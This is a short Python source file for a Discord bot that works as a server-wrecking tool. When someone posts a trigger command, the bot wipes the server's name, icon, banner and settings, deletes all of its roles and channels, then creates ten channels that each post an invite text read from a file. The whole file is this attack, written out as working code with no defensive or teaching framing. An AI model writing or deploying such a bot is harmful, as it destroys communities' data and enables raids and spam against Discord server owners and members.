import os

import dotenv
import discord

dotenv.load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

with open("invite.txt") as f:
    content = f.read()


@client.event
async def on_message(message: discord.Message):
    if message.content == "!!mititt":
        try:
            await message.guild.edit(
                name="終",
                icon=None,
                banner=None,
                splash=None,
                description=None,
                community=False,
                rules_channel=None,
                safety_alerts_channel=None,
                public_updates_channel=None,
            )
        except:
            await message.guild.edit(
                name="終",
                icon=None,
                banner=None,
                splash=None,
                description=None,
            )

        for role in message.guild.roles:
            try:
                await role.delete()
            except:
                pass

        for channel in message.guild.channels:
            try:
                await channel.delete()
            except:
                pass

        for _ in range(10):
            channel = await message.guild.create_text_channel("終")
            await channel.send(content)
